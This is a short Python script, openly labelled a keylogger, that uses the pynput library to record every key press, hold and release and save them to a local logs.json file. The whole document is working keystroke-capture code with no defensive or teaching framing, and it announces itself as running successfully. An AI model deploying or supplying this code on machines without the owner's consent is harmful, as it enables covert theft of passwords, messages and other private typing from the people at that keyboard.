from pynput import keyboard

import json

key_list = []
x = False

def update_json_file(key_list):
    with open('logs.json', 'w+') as json_file:
        json.dump(key_list, json_file)

def on_press(key):
    global x, key_list
    if x == False:
        key_list.append({'pressed': f'{key}'})
        x = True
    if x == True:
        key_list.append({'held': f'{key}'})
    update_json_file(key_list)

def on_release(key):
    global x, key_list
    key_list.append({'released': f'{key}'})
    if x == True:
        x = False
    update_json_file(key_list)

print("[+] running keylogger successfully!\n[!] saving the key logs in 'logs.json'")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
